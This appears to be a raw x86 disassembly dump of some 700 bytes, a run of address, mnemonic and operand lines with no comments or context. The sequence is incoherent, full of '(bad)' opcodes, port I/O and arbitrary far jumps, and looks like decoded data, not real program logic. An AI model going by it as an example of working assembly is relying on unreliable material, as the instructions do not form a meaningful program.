  40b03a:	jb     0x40b065
  40b03c:	jno    0x40b05a
  40b03e:	arpl   WORD PTR [ecx],di
  40b040:	sbb    edx,DWORD PTR [eax+edx*4+0x32]
  40b044:	icebp  
  40b045:	jecxz  0x40b09d
  40b047:	std    
  40b048:	or     dh,BYTE PTR [edx]
  40b04a:	addr16 int3 
  40b04c:	adc    eax,0xded6286e
  40b051:	pop    ecx
  40b052:	mov    esp,DWORD PTR [eax+ebx*2]
  40b055:	stos   DWORD PTR es:[edi],eax
  40b056:	loopne 0x40b03b
  40b058:	xchg   DWORD PTR [ebp+0x139b96c4],ebp
  40b05e:	mov    eax,0x17a501d9
  40b063:	cmc    
  40b064:	fimul  DWORD PTR [eax-0x29154905]
  40b06a:	xchg   ebx,eax
  40b06b:	jp     0x40b018
  40b06d:	and    ecx,DWORD PTR [ecx+0x2f6b2ae5]
  40b073:	and    BYTE PTR ds:0xa2a5bbf7,cl
  40b079:	mov    bh,0x6d
  40b07b:	cmp    eax,0x1f2ec401
  40b080:	aas    
  40b081:	dec    ecx
  40b082:	mov    al,0x79
  40b084:	push   cs
  40b085:	mov    al,ds:0xe967c69
  40b08a:	nop
  40b08b:	pop    edx
  40b08c:	adc    eax,DWORD PTR [esi-0x36a5b906]
  40b092:	sbb    ebp,DWORD PTR [esi-0x2e36ae03]
  40b098:	xchg   edx,eax
  40b099:	es (bad) 
  40b09b:	popa   
  40b09c:	mov    ecx,0xb6f1592c
  40b0a1:	inc    eax
  40b0a2:	jns    0x40b0d4
  40b0a4:	xchg   BYTE PTR [esp+edi*4+0x4e],dl
  40b0a8:	aas    
  40b0a9:	sub    bl,BYTE PTR [ecx+0x3e]
  40b0ac:	mov    dh,0x99
  40b0ae:	aad    0x99
  40b0b0:	std    
  40b0b1:	pusha  
  40b0b2:	jge    0x40b0c1
  40b0b4:	imul   esp,edi,0xffffffab
  40b0b7:	mov    esi,0xa90c18d2
  40b0bc:	sub    eax,0x701b0908
  40b0c1:	xchg   DWORD PTR [ecx+0x3d],ecx
  40b0c4:	mov    edx,0x77af9bf7
  40b0c9:	add    eax,0x945a0f27
  40b0ce:	xor    ebp,DWORD PTR [esi]
  40b0d0:	repnz lahf 
  40b0d2:	shr    DWORD PTR [ecx-0x4c],1
  40b0d5:	mov    ds:0xa5b2e149,al
  40b0da:	pushf  
  40b0db:	adc    al,0x7e
  40b0dd:	mov    dl,0xa9
  40b0df:	pop    edi
  40b0e0:	mov    al,ds:0x4a6542bd
  40b0e5:	ds shl bh,0xc6
  40b0e9:	push   ds
  40b0ea:	jo     0x40b0dc
  40b0ec:	add    al,0xf9
  40b0ee:	dec    eax
  40b0ef:	add    ch,BYTE PTR [ebx-0x62]
  40b0f2:	mov    bl,0xf
  40b0f4:	mov    al,0x83
  40b0f6:	lds    ebx,FWORD PTR [edi]
  40b0f8:	and    BYTE PTR [eax+0xb],bl
  40b0fb:	gs (bad) 
  40b0fd:	loop   0x40b0c0
  40b0ff:	push   ecx
  40b100:	add    DWORD PTR [ecx],esp
  40b102:	in     al,dx
  40b103:	sar    DWORD PTR [esi-0x48aedeb9],0x90
  40b10a:	adc    bl,bl
  40b10c:	in     eax,0x91
  40b10e:	and    BYTE PTR [ecx-0x5d31de55],0x62
  40b115:	sub    ebp,DWORD PTR [ebx]
  40b117:	or     esp,DWORD PTR [edx+0x4d]
  40b11a:	jle    0x40b0ce
  40b11c:	sub    edx,DWORD PTR [ecx]
  40b11e:	ja     0x40b0fa
  40b120:	and    al,0xd4
  40b122:	fdivr  QWORD PTR [eax+0x1cb39b72]
  40b128:	and    bh,BYTE PTR [ecx+0x1]
  40b12b:	ret    0x4cba
  40b12e:	repnz mov esp,0x97b1efa0
  40b134:	fld    DWORD PTR ds:0x58e6c696
  40b13a:	sub    al,0x9d
  40b13c:	mov    esi,0xbdc57152
  40b141:	lods   eax,DWORD PTR ds:[esi]
  40b142:	pop    esp
  40b143:	pop    edi
  40b144:	nop
  40b145:	outs   dx,DWORD PTR ds:[esi]
  40b146:	pop    esi
  40b147:	mov    cl,0x38
  40b149:	adc    bh,BYTE PTR [esp+ebx*8-0x1f12b0ea]
  40b150:	inc    ebx
  40b151:	in     eax,dx
  40b152:	scas   al,BYTE PTR es:[edi]
  40b153:	cld    
  40b154:	ja     0x40b12c
  40b156:	mov    ch,0x7e
  40b158:	mov    bh,0xf2
  40b15a:	je     0x40b1d9
  40b15c:	sbb    DWORD PTR [esi-0x38c5cde3],eax
  40b162:	xor    al,ch
  40b164:	sar    edi,cl
  40b166:	out    0xc5,eax
  40b168:	sub    BYTE PTR [ecx+0x78],al
  40b16b:	stc    
  40b16c:	jmp    0x40b16f
  40b16e:	lahf   
  40b16f:	push   ebp
  40b170:	jae    0x40b1e8
  40b172:	sub    DWORD PTR [edi],0xee583aec
  40b178:	mul    BYTE PTR [esi+0x6d]
  40b17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b17c:	push   ds
  40b17d:	loop   0x40b1b9
  40b17f:	sub    DWORD PTR [edi-0x611d53a7],ebp
  40b185:	into   
  40b186:	ret    0xd762
  40b189:	add    eax,0xa40bddbf
  40b18e:	and    BYTE PTR [eax+0xd72fd4c],bl
  40b194:	inc    eax
  40b195:	(bad)  
  40b197:	(bad)  
  40b198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b199:	xchg   ecx,eax
  40b19a:	sub    edi,esi
  40b19c:	pop    edi
  40b19d:	xchg   ebp,eax
  40b19e:	pop    eax
  40b19f:	call   DWORD PTR [ecx-0x51]
  40b1a2:	mov    ah,0xd6
  40b1a4:	pop    edx
  40b1a5:	das    
  40b1a6:	in     eax,0x5e
  40b1a8:	mov    bh,0xd9
  40b1aa:	addr16 mov ds:0xc61b,al
  40b1ae:	and    cl,0x49
  40b1b1:	push   edi
  40b1b2:	xchg   esi,ecx
  40b1b4:	sub    ecx,DWORD PTR [ebp-0x62]
  40b1b7:	imul   di,WORD PTR [ebx+0x5f],0x55
  40b1bc:	mov    ecx,0x8db48c07
  40b1c1:	repz xchg esi,eax
  40b1c3:	aad    0xf4
  40b1c5:	(bad)  
  40b1c6:	ins    BYTE PTR es:[edi],dx
  40b1c7:	and    bp,WORD PTR [eax]
  40b1ca:	xlat   BYTE PTR ds:[ebx]
  40b1cb:	xchg   edi,eax
  40b1cc:	retf   0x9631
  40b1cf:	test   ecx,0x60168ab5
  40b1d5:	int    0xa1
  40b1d7:	inc    edi
  40b1d8:	out    dx,eax
  40b1d9:	or     ebx,esp
  40b1db:	lods   eax,DWORD PTR ds:[esi]
  40b1dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1dd:	mov    cl,0xf2
  40b1df:	xchg   ebx,eax
  40b1e0:	rcl    esi,1
  40b1e2:	inc    esi
  40b1e3:	inc    ecx
  40b1e4:	mov    cl,0xba
  40b1e6:	pusha  
  40b1e7:	jp     0x40b1ce
  40b1e9:	add    al,0xea
  40b1eb:	xchg   edx,eax
  40b1ec:	dec    edx
  40b1ed:	out    0xac,al
  40b1ef:	push   0x12
  40b1f1:	shl    edi,cl
  40b1f3:	pop    ds
  40b1f4:	dec    eax
  40b1f5:	sbb    BYTE PTR [edi],dh
  40b1f7:	mov    edi,0x562da5c6
  40b1fc:	(bad)  
  40b1fd:	and    eax,0x5b982743
  40b202:	xchg   ebp,eax
  40b203:	cmp    DWORD PTR [edi],ebx
  40b205:	and    BYTE PTR [ebx],al
  40b207:	xor    esp,DWORD PTR [eax+ebp*8+0xb41a995]
  40b20e:	fimul  WORD PTR [edx+0x32]
  40b211:	fimul  DWORD PTR [eax-0x73d3c271]
  40b217:	repnz call 0x3df1:0xb90970ff
  40b21f:	(bad)  
  40b220:	xor    eax,DWORD PTR [edx+0x2e]
  40b223:	dec    ecx
  40b224:	(bad)  
  40b225:	jmp    0x49cc6981
  40b22a:	aam    0x5
  40b22c:	sub    ebx,0xffffff96
  40b22f:	fistp  DWORD PTR [ebp+eax*1-0x5383f1fc]
  40b236:	push   esi
  40b237:	xchg   edx,eax
  40b238:	retf   
  40b239:	in     al,dx
  40b23a:	inc    ecx
  40b23b:	lock inc edi
  40b23d:	icebp  
  40b23e:	jno    0x40b2a8
  40b240:	xor    al,0x8a
  40b242:	dec    edi
  40b243:	rcr    DWORD PTR [edx+0x78c521f],0x3f
  40b24a:	out    dx,eax
  40b24b:	lds    esp,FWORD PTR [edi-0x38ef163a]
  40b251:	jmp    0xeaa630a8
  40b256:	popf   
  40b257:	dec    eax
  40b258:	mov    ds:0xe2bb4299,eax
  40b25d:	push   eax
  40b25e:	adc    BYTE PTR [edi+0x66],ah
  40b261:	mov    bh,0xd8
  40b263:	mov    ds:0x6b5d9c71,eax
  40b268:	les    esp,FWORD PTR [ecx-0x5a]
  40b26b:	jmp    0xda297755
  40b270:	or     al,0x7f
  40b272:	daa    
  40b273:	xchg   DWORD PTR [ecx+0x75],esp
  40b276:	inc    DWORD PTR [edi+0x648a6391]
  40b27c:	call   0x28321426
  40b281:	test   al,0x67
  40b283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b284:	je     0x40b232
  40b286:	push   eax
  40b287:	cwde   
  40b288:	jmp    0x877:0x1fc523c4
  40b28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b290:	mov    ds:0xc662c1ff,al
  40b295:	mov    eax,0xc836f455
  40b29a:	jne    0x40b275
  40b29c:	pop    ecx
  40b29d:	out    0x97,al
  40b29f:	sub    BYTE PTR [ebx-0x2b],bl
  40b2a2:	(bad)  
  40b2a4:	inc    ebp
  40b2a5:	std    
  40b2a6:	call   0xdd28887d
  40b2ab:	mov    ebx,0xbdc7ae9e
  40b2b0:	xacquire xchg BYTE PTR [ebx],cl
  40b2b3:	call   0xe039:0xf2170cf5
  40b2ba:	mov    ecx,ds
  40b2bc:	cwde   
  40b2bd:	mov    eax,0x7698dafd
  40b2c2:	cmp    eax,DWORD PTR [ecx-0x18]
  40b2c5:	int3   
  40b2c6:	mov    bl,0xcc
  40b2c8:	inc    ebp
  40b2c9:	cmc    
  40b2ca:	push   ds
  40b2cb:	push   0x6e
  40b2cd:	daa    
  40b2ce:	out    0xd,eax
  40b2d0:	sub    eax,DWORD PTR [edi+0x7b]
  40b2d3:	cmp    eax,0xadb4ce0a
  40b2d8:	inc    esi
  40b2d9:	xor    BYTE PTR [edx+edi*4+0x4e],al
  40b2dd:	push   cs
  40b2de:	(bad)  
  40b2df:	mov    ch,0x93
  40b2e1:	add    esp,ebp
  40b2e3:	add    BYTE PTR [ebx+ebp*2-0x6a],dl
  40b2e7:	mov    esi,fs
  40b2e9:	mov    dh,BYTE PTR [edx-0x3f]
  40b2ec:	adc    BYTE PTR [ecx+0x787ed07f],ch
  40b2f2:	std    
  40b2f3:	jle    0x40b339
  40b2f5:	out    0xe7,al
  40b2f7:	add    DWORD PTR ds:0x5c82e27a,0x1e
  40b2fe:	ins    DWORD PTR es:[edi],dx
  40b2ff:	pop    edi
  40b300:	addr16 test al,0x87
  40b303:	mov    ah,0xfd
  40b305:	in     al,0xc8
  40b307:	or     BYTE PTR [edi-0x34],ch
  40b30a:	pop    esp
  40b30b:	dec    esp
  40b30c:	aad    0xa
  40b30e:	aas    
  40b30f:	je     0x40b34c
  40b311:	dec    esp
  40b312:	dec    BYTE PTR [ecx]
  40b314:	lock jno 0x40b307
  40b317:	fbld   TBYTE PTR [ebx+esi*8]
  40b31a:	dec    ebx
  40b31b:	jne    0x40b339
  40b31d:	sub    dl,BYTE PTR [edx+ebx*2+0x3e]
  40b321:	adc    DWORD PTR [ebx-0x5e09239f],esi
  40b327:	(bad)  
  40b329:	add    BYTE PTR [edx],cl
  40b32b:	inc    eax
  40b32c:	sbb    eax,0xc3482729
  40b331:	jp     0x40b2bf
  40b333:	rol    BYTE PTR [edx],cl
  40b335:	stos   DWORD PTR es:[edi],eax
  40b336:	pop    ecx
  40b337:	popa   
  40b338:	or     ch,dl
  40b33a:	mov    ah,0xa3
  40b33c:	ja     0x40b3bd
  40b33e:	addr16 mov esp,0x979f8a96
  40b344:	inc    ecx
  40b345:	mov    al,bh
  40b347:	sbb    eax,DWORD PTR [edx+0x60]
  40b34a:	loop   0x40b309
  40b34c:	test   al,0x10
  40b34e:	inc    edx
  40b34f:	push   edi
  40b350:	mov    ah,0xd4
  40b352:	mov    esp,0xabfc121f
  40b357:	pop    es
  40b358:	bound  ecx,QWORD PTR [ebx+edi*2+0x4]
  40b35c:	fisttp DWORD PTR [edi-0x1]
  40b35f:	xchg   edi,eax
  40b360:	cld    
  40b361:	inc    esi
  40b362:	bound  esi,QWORD PTR [eax]
  40b364:	or     DWORD PTR [esi-0x3103b43a],0xeafbda5f
  40b36e:	cmp    ch,0x97
  40b371:	daa    
  40b372:	scas   eax,DWORD PTR es:[edi]
  40b373:	addr16 add bl,ah
  40b376:	jmp    0x2210:0x103568ac
  40b37d:	xor    cl,bh
  40b37f:	mov    BYTE PTR [edi+0x1e],bl
  40b382:	mov    dl,0x99
  40b384:	(bad)  
  40b385:	fbld   TBYTE PTR [esi+0x28]
  40b388:	mov    eax,0x5c3c0aab
  40b38d:	jmp    0xca6a:0xebed0462
  40b394:	pop    edx
  40b395:	jmp    0x40b3c6
  40b397:	push   ebp
  40b398:	retf   0x5c4f
  40b39b:	(bad)
  40b39e:	jmp    0x4e68:0x75481430
  40b3a5:	add    edi,DWORD PTR ds:0xc70c9050
  40b3ab:	push   esp
  40b3ac:	out    dx,eax
  40b3ad:	mov    ecx,0x1c36efb
  40b3b2:	dec    edx
  40b3b3:	mov    ah,0xc8
  40b3b5:	je     0x40b33d
  40b3b7:	paddw  mm7,QWORD PTR [ebx+0x4c43a17a]
  40b3be:	int    0x63
  40b3c0:	fst    QWORD PTR ds:0x58dfffd4
  40b3c6:	xchg   ebx,eax
  40b3c7:	inc    edi
  40b3c8:	shl    ch,1
  40b3ca:	inc    ebp
  40b3cb:	add    ah,0x99
  40b3ce:	mov    ds:0xf2a5b224,eax
  40b3d3:	out    dx,eax
  40b3d4:	stc    
  40b3d5:	inc    ecx
  40b3d6:	cmp    ecx,DWORD PTR [esi+0xb]
  40b3d9:	xchg   edx,eax
  40b3da:	mov    dl,0xd4
  40b3dc:	jbe    0x40b3af
  40b3de:	lods   al,BYTE PTR ds:[esi]
  40b3df:	(bad)  
  40b3e0:	ud0    edi,DWORD PTR [esp+edi*1]
  40b3e4:	mov    bl,0x97
  40b3e6:	(bad)  
  40b3e7:	imul   esi,edx,0x445f35ab
  40b3ed:	test   eax,0x50c80b7b
  40b3f3:	add    DWORD PTR [ebx-0x2a],ecx
  40b3f6:	dec    ecx
  40b3f7:	in     eax,0x9e
  40b3f9:	xor    al,BYTE PTR [esi]
  40b3fb:	mov    BYTE PTR [ecx],0x32
  40b3fe:	loope  0x40b3bf
  40b400:	jl     0x40b3e9
  40b402:	pusha  
  40b403:	xchg   esp,eax
  40b404:	push   cs
  40b405:	inc    ebx
  40b406:	cmp    ebp,DWORD PTR [eax]
  40b408:	out    dx,al
  40b409:	and    dh,BYTE PTR [ebx-0xe]
  40b40c:	dec    esi
  40b40d:	push   es
  40b40e:	jmp    0xcc3300d1
  40b413:	push   edi
  40b414:	mov    dl,0x50
  40b416:	push   ss
  40b417:	cwde   
  40b418:	pop    ebx
  40b419:	mov    ah,0xfa
  40b41b:	mov    esi,0x8a950c97
  40b420:	add    DWORD PTR [ecx-0x7ce34a6e],ebx
  40b426:	not    DWORD PTR [ebx]
  40b428:	cld    
  40b429:	cmp    eax,0x61636fc
  40b42e:	add    esp,eax
  40b430:	jnp    0x40b4a1
  40b432:	(bad)  [edi+esi*2+0x53]
  40b436:	mov    ds:0x60b80a15,al
  40b43b:	call   FWORD PTR ds:0x819706b0
  40b441:	pop    es
  40b442:	sar    BYTE PTR [eax-0x7d21f2ef],cl
  40b448:	bound  edx,QWORD PTR ds:0x45740e69
  40b44e:	sub    ch,BYTE PTR [esp+esi*4]
  40b451:	jge    0x40b3d9
  40b453:	out    dx,eax
  40b454:	in     al,0x63
  40b456:	fist   DWORD PTR [edi-0x76]
  40b459:	lods   eax,DWORD PTR ds:[esi]
  40b45a:	cdq    
  40b45b:	sti    
  40b45c:	xchg   DWORD PTR [ebp-0x4e38ad60],edx
  40b462:	je     0x40b4c1
  40b464:	xor    al,0x5e
  40b466:	jp     0x40b45a
  40b468:	mov    ecx,0xbacfa878
  40b46d:	loope  0x40b4b7
  40b46f:	adc    eax,0x6def4d98
  40b474:	aad    0xb6
  40b476:	jl     0x40b4ce
  40b478:	cmp    DWORD PTR [ebx+0xf60f5b0],ebp
  40b47e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47f:	ds push ss
  40b481:	lds    ecx,FWORD PTR [edx+0x2faaa936]
  40b487:	lods   al,BYTE PTR ds:[esi]
  40b488:	pushf  
  40b489:	jmp    0x40b45e
  40b48b:	pop    ss
  40b48c:	cmc    
  40b48d:	mov    esi,0x99b69f85
  40b492:	sub    dl,BYTE PTR ds:0xbb8e5655
  40b498:	mov    edi,DWORD PTR [edx]
  40b49a:	in     al,0x2a
  40b49c:	xchg   BYTE PTR [eax+0x33],bh
  40b49f:	dec    ebp
  40b4a0:	sbb    DWORD PTR [ebp-0x3],0x58
  40b4a4:	pop    eax
  40b4a5:	shr    BYTE PTR [edx+0x24de258d],cl
  40b4ab:	fsub   st,st(1)
  40b4ae:	pop    ecx
  40b4af:	adc    BYTE PTR [eax+0x179fa020],bl
  40b4b5:	cdq    
  40b4b6:	(bad)  
  40b4b8:	cli    
  40b4b9:	jbe    0x40b4ee
  40b4bb:	test   eax,0xfc2e48e2
  40b4c0:	and    eax,DWORD PTR [eax]
  40b4c2:	lahf   
  40b4c3:	out    dx,al
  40b4c4:	sub    DWORD PTR [edi],0xab87a52e
  40b4ca:	lods   eax,DWORD PTR ds:[esi]
  40b4cb:	and    edx,DWORD PTR [eax]
  40b4cd:	jbe    0x40b51f
  40b4cf:	call   0x43f84bb9
  40b4d4:	jg     0x40b4de
  40b4d6:	cmp    edx,ecx
  40b4d8:	div    BYTE PTR [ecx]
  40b4da:	movntq QWORD PTR [ebx-0x61],mm5
  40b4de:	fistp  WORD PTR [esi-0x53ddab01]
  40b4e4:	call   0x243c:0x53f2fd40
  40b4eb:	jmp    0x40b476
  40b4ed:	jns    0x40b480
  40b4ef:	bound  edx,QWORD PTR [edx-0x1e]
  40b4f2:	ins    BYTE PTR es:[edi],dx
  40b4f3:	stos   DWORD PTR es:[edi],eax
  40b4f4:	leave  
  40b4f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f6:	addr16 ss xchg esi,eax
  40b4f9:	or     DWORD PTR [esi+0x1a],edx
  40b4fc:	or     DWORD PTR [ecx+0x47aafb73],0x5319178d
  40b506:	push   edi
  40b507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b508:	jge    0x40b4a1
  40b50a:	lahf   
  40b50b:	push   es
  40b50c:	fist   DWORD PTR [ebx]
  40b50e:	dec    edi
  40b50f:	xchg   ecx,eax
  40b510:	mov    ch,0x6f
  40b512:	js     0x40b54f
  40b514:	jns    0x40b517
  40b516:	outs   dx,DWORD PTR ds:[esi]
  40b517:	(bad)  
  40b518:	ds mov ebx,0xb56e391f
  40b51e:	(bad)  
  40b51f:	les    edi,FWORD PTR [esi+edi*4]
  40b522:	repnz into 
  40b524:	ins    BYTE PTR es:[edi],dx
  40b525:	xor    al,0xb0
  40b527:	sbb    DWORD PTR [eax-0x596579c9],ecx
  40b52d:	and    edx,DWORD PTR [esi+0x78a6cd70]
  40b533:	or     DWORD PTR [ecx-0x64],edi
  40b536:	rcr    DWORD PTR [ebp+0x68],cl
  40b539:	jno    0x40b547
  40b53b:	inc    edx
  40b53c:	dec    esp
  40b53d:	out    0x87,eax
  40b53f:	scas   eax,DWORD PTR es:[edi]
  40b540:	xor    al,0xa7
  40b542:	aas    
  40b543:	fidivr DWORD PTR [ebx-0x21cd1af0]
  40b549:	fisttp DWORD PTR [ecx]
  40b54b:	jmp    0x10c4:0xd6725ec2
  40b552:	je     0x40b52e
  40b554:	or     DWORD PTR [esi+0x53],esi
  40b557:	loop   0x40b59a
  40b559:	addr16 jnp 0x40b5ce
  40b55c:	test   edi,esi
  40b55e:	ja     0x40b4e3
  40b560:	mov    edi,0xdcccba8
  40b565:	inc    ebp
  40b566:	ret    
  40b567:	sti    
  40b568:	push   esp
  40b569:	jecxz  0x40b50b
  40b56b:	inc    ebp
  40b56c:	add    esp,DWORD PTR [edi-0x67]
  40b56f:	in     al,dx
  40b570:	xor    DWORD PTR [edx],esi
  40b572:	or     esp,DWORD PTR [ecx]
  40b574:	jae    0x40b52e
  40b576:	sbb    al,0xc1
  40b578:	pop    ecx
  40b579:	rol    ah,0xfb
  40b57c:	imul   ebx,ebx,0x13f851dc
  40b582:	or     BYTE PTR [ecx-0x25388ca9],al
  40b588:	inc    ebx
  40b589:	inc    ebx
  40b58a:	pop    edi
  40b58b:	xchg   esi,eax
  40b58c:	or     eax,0x90ac36fb
  40b591:	sahf   
  40b592:	xor    BYTE PTR [ebp+edx*8+0x8b86da9],dh
  40b599:	sar    BYTE PTR [eax],cl
  40b59b:	and    eax,0x2160b630
  40b5a0:	add    al,0x7c
  40b5a2:	sbb    BYTE PTR [esi-0x4f],dh
  40b5a5:	pop    edi
  40b5a6:	into   
  40b5a7:	in     eax,0x12
  40b5a9:	rol    BYTE PTR [edx],cl
  40b5ab:	xor    BYTE PTR [ebp-0x7ffc8d98],ch
  40b5b1:	shl    ebx,1
  40b5b3:	mov    ds:0xfec3e324,eax
  40b5b8:	add    BYTE PTR [eax+0x3ebe69d8],bl
  40b5be:	test   ebx,ebx
  40b5c0:	jno    0x40b54a
  40b5c2:	jmp    0x40b63e
  40b5c4:	in     al,dx
  40b5c5:	mov    bx,0x1130
  40b5c9:	pushf  
  40b5ca:	or     edi,DWORD PTR [edx-0x71]
  40b5cd:	in     eax,0x65
  40b5cf:	ins    DWORD PTR es:[edi],dx
  40b5d0:	mov    edi,0x7cb29e3b
  40b5d5:	pop    es
  40b5d6:	fild   WORD PTR [eax-0xa6f1b07]
  40b5dc:	pop    edx
  40b5dd:	jge    0x40b583
  40b5df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5e0:	out    dx,eax
  40b5e1:	or     edx,esi
  40b5e3:	fwait
  40b5e4:	and    edx,DWORD PTR ds:0x2d2b9bce
  40b5ea:	lea    esp,[ecx+0x7ad3d7d5]
  40b5f0:	in     al,dx
  40b5f1:	(bad)  
  40b5f2:	nop
  40b5f3:	or     eax,0x748b3a36
  40b5f8:	mov    DWORD PTR [ebp+ebp*1+0x75c37b2c],0x4f500944
  40b603:	sub    bh,BYTE PTR [edi]
  40b605:	pop    edi
  40b606:	or     DWORD PTR [esi-0x6d],esi
  40b609:	push   ecx
  40b60a:	jmp    0x8eb66e78
  40b60f:	xor    eax,0x16dea4a8
  40b614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b615:	in     eax,0xf9
  40b617:	cmp    eax,0x3613fb7e
  40b61c:	(bad)  
  40b61d:	icebp  
  40b61e:	sbb    DWORD PTR [esi+0x5a],edx
  40b621:	cld    
  40b622:	mov    eax,ds:0x7033394f
  40b627:	(bad)  
  40b628:	scas   eax,DWORD PTR es:[edi]
  40b629:	sbb    DWORD PTR ds:0x2abfef05,0x9c56d102
  40b633:	jmp    0x124c:0x7a213624
  40b63a:	mov    ch,0xa7
  40b63c:	xadd   esi,esp
  40b63f:	call   0xdf1:0xcf6367dc
  40b646:	inc    esp
  40b647:	dec    esi
  40b648:	inc    esi
  40b649:	push   0x8fea313a
  40b64e:	inc    edi
  40b64f:	dec    edx
  40b650:	aas    
  40b651:	ss cvtpi2ps xmm3,mm7
  40b655:	aaa    
  40b656:	inc    edi
  40b657:	sub    DWORD PTR [esi],edx
  40b659:	push   esp
  40b65a:	add    dl,BYTE PTR [edi-0x43]
  40b65d:	fadd   QWORD PTR [esi+0x59fe353a]
  40b663:	fwait
  40b664:	sbb    DWORD PTR [eax-0x3c980aa7],ecx
  40b66a:	scas   al,BYTE PTR es:[edi]
  40b66b:	lahf   
  40b66c:	pop    esi
  40b66d:	lds    eax,FWORD PTR [ebp-0x11]
  40b670:	xchg   edi,eax
  40b671:	push   edx
  40b672:	ret    
  40b673:	sub    BYTE PTR [eax+edx*4],dl
  40b676:	xchg   edi,eax
  40b677:	xchg   esi,eax
  40b678:	out    0x6b,eax
  40b67a:	dec    edi
  40b67b:	retf   0xfc0
  40b67e:	xchg   ebx,eax
  40b67f:	sbb    eax,0x70b6e9bb
  40b684:	jne    0x40b64b
  40b686:	mov    BYTE PTR [ecx],ch
  40b688:	pop    eax
  40b689:	jmp    0x40b657
  40b68b:	fcmovnbe st,st(0)
  40b68d:	ss hlt 
  40b68f:	mov    al,0x1f
  40b691:	pop    ds
  40b692:	push   0xffffffa8
  40b694:	popf   
  40b695:	dec    esp
  40b696:	cmp    DWORD PTR [esi-0x18],eax
  40b699:	dec    edi
  40b69a:	add    eax,DWORD PTR [edi]
  40b69c:	xchg   ebp,eax
  40b69d:	pop    es
  40b69e:	dec    ebp
  40b69f:	push   ss
  40b6a0:	dec    esp
  40b6a1:	pop    esi
  40b6a2:	pop    edi
  40b6a3:	js     0x40b6a2
  40b6a5:	push   ss
  40b6a6:	fisubr DWORD PTR [ecx-0xb39d1cd]
  40b6ac:	dec    ecx
  40b6ad:	mov    BYTE PTR [eax],ch
  40b6af:	daa    
  40b6b0:	sbb    cl,0x22
  40b6b3:	(bad)  
  40b6b4:	mov    dl,0x13
  40b6b6:	inc    ecx
  40b6b7:	iret   
  40b6b8:	in     al,dx
  40b6b9:	test   eax,0xd2b63a58
  40b6be:	popa   
  40b6bf:	cmc    
  40b6c0:	loop   0x40b72b
  40b6c2:	(bad)  
  40b6c3:	cld    
  40b6c4:	dec    ebp
  40b6c5:	(bad)  
  40b6c6:	ja     0x40b64d
  40b6c8:	add    bh,BYTE PTR [esi]
  40b6ca:	mov    WORD PTR [ebp-0x1f09697e],gs
  40b6d0:	ja     0x40b6e1
  40b6d2:	sbb    esp,DWORD PTR [ebp+ebx*4+0x17]
  40b6d6:	fidivr DWORD PTR es:[edi-0x42]
  40b6da:	rcr    DWORD PTR [edx+0x25],1
  40b6dd:	mov    WORD PTR [edi],ds
  40b6df:	div    dl
  40b6e1:	jns    0x40b738
  40b6e3:	cmp    DWORD PTR [ebp-0x606dc387],ebx
  40b6e9:	ret    
  40b6ea:	or     eax,0x4b80b8c4
  40b6ef:	push   0xeb269cd4
  40b6f4:	pop    es
  40b6f5:	xlat   BYTE PTR ds:[ebx]
  40b6f6:	push   0x4a
  40b6f8:	out    dx,eax
  40b6f9:	mov    ebp,0xed494ac0
  40b6fe:	imul   ecx,esp,0x6dd4df74
  40b704:	mov    ebp,0x78e66b59
  40b709:	fnsave [ebp+0x5be18df9]
  40b70f:	xchg   ebx,eax
  40b710:	mov    esp,ds
  40b712:	stos   BYTE PTR es:[edi],al
  40b713:	jae    0x40b75d
  40b715:	(bad)  
  40b716:	push   cs
  40b717:	test   DWORD PTR [edx-0x7d],esi
  40b71a:	ficomp DWORD PTR [ecx]
  40b71c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b71e:	jno    0x40b76c
  40b720:	cs stc 
  40b722:	fldenv [ecx-0x1aa92f9c]
  40b728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b729:	jp     0x40b78d
  40b72b:	sub    BYTE PTR ds:0x11f4c706,0x1e
  40b732:	lock sbb al,bh
  40b735:	int    0xb6
  40b737:	adc    ebp,edx
  40b739:	ja     0x40b75b
  40b73b:	fistp  DWORD PTR [esi+0x5eec7aab]
  40b741:	xor    al,0xb6
  40b743:	cli    
  40b744:	push   ecx
  40b745:	jo     0x40b725
  40b747:	sbb    esi,DWORD PTR [edi+0x15]
  40b74a:	dec    ebp
  40b74b:	push   esi
  40b74c:	shr    ah,cl
  40b74e:	dec    ecx
  40b74f:	fsubrp st(3),st
  40b751:	cld    
  40b752:	iret   
  40b753:	test   DWORD PTR [edi],ecx
  40b755:	in     eax,dx
  40b756:	jge    0x40b780
  40b758:	inc    esp
  40b759:	loopne 0x40b761
  40b75b:	dec    ebx
  40b75c:	ret    
  40b75d:	push   cs
  40b75e:	js     0x40b76b
  40b760:	sub    DWORD PTR [esi-0x271052c],edx
  40b766:	adc    al,ch
  40b768:	pushf  
  40b769:	dec    edx
  40b76a:	cwde   
  40b76b:	inc    esi
  40b76c:	test   DWORD PTR [edx-0x3b070f49],ecx
  40b772:	mov    edx,0xf1f4059d
  40b777:	outs   dx,BYTE PTR ds:[esi]
  40b778:	lds    edi,FWORD PTR [ecx]
  40b77a:	and    ah,BYTE PTR [ebx+ebx*1+0x2b44b3ca]
  40b781:	rcl    DWORD PTR [ecx+0x2f],1
  40b784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b785:	js     0x40b7a2
  40b787:	sbb    BYTE PTR [ebx],ch
  40b789:	shl    BYTE PTR [esi+0x46],1
  40b78c:	jns    0x40b7d2
  40b78e:	xor    BYTE PTR [edi+0x27062486],bl
  40b794:	jecxz  0x40b781
  40b796:	xor    DWORD PTR [ebp+0x5055ed15],0x78288c8c
  40b7a0:	test   al,0x58
  40b7a2:	cmp    eax,0x7494c3c2
  40b7a7:	mov    bh,0x84
  40b7a9:	stc    
  40b7aa:	nop
  40b7ab:	mov    eax,ds:0x506612e4
  40b7b0:	xor    esi,eax
  40b7b2:	fs pop ecx
  40b7b4:	mov    esi,0x83c0871f
